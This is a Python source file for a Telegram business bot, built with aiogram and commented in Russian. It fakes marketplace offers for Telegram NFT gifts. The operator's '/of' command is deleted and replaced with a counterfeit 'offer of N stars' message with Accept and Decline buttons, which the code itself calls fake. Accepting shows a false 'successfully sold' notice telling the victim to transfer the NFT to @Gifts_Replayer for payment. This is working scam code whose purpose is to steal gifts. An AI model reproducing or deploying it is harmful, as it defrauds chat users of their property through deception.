import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions

BOT_TOKEN = os.getenv("BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id:
        return

    parts = message.text.split()
    if len(parts) < 3:
        return

    link = parts[1]
    try:
        amount = int(parts[2])
    except ValueError:
        return

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match:
        return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    try:
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[message.message_id]
        )

        caption_text = (
            f"Пользователь ({username})\n"
            f"предлагает вам\n"
            f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
            ]
        ])

        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        )

    except Exception as e:
        print(f"Ошибка отправки: {e}")

# --- ОБРАБОТКА НАЖАТИЙ ---
@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message:
        await callback.answer("Сообщение не найдено.", show_alert=True)
        return

    data_parts = callback.data.split(":")
    action = data_parts[0]
    gift_slug = data_parts[1]
    amount = data_parts[2]

    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)

    try:
        if action == "accept":
            new_text = (
                f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
            )
            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Передать NFT", url=link)]
            ])
        else:
            new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
            new_keyboard = None

        # Пытаемся отредактировать сообщение
        await bot.edit_message_text(
            text=new_text,
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            reply_markup=new_keyboard,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        await callback.answer() # Успешно

    except Exception as e:
        # ВЫВОДИМ РЕАЛЬНУЮ ОШИБКУ, чтобы понять, почему не редактируется
        print(f"!!! РЕАЛЬНАЯ ОШИБКА РЕДАКТИРОВАНИЯ: {e} !!!")
        await callback.answer(f"Ошибка: {e}", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
